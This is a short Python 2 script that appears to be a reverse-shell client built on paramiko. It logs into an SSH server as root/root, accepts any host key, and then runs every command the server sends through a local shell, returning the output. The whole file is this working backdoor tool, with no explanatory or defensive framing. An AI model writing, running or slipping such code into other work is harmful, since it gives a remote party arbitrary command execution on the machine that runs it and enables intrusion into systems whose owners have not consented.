import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	#client.load_host_keys('')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	print 'connecting'
	client.connect(ip, username = user, password = passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print ssh_session.recv(1024) #read banner
		while True:
			command = ssh_session.recv(1024) #get the command fron the SSH server
			try:
				cmd_output = subprocess.check_output(command, shell = True)
				ssh_session.send(cmd_output)
			except Exception,e:
				ssh_session.send(str(e))
		client.close()
	return


if __name__ == '__main__':
	print 'go'
	ssh_command('127.0.0.1', 'root', 'root','ClientConnected')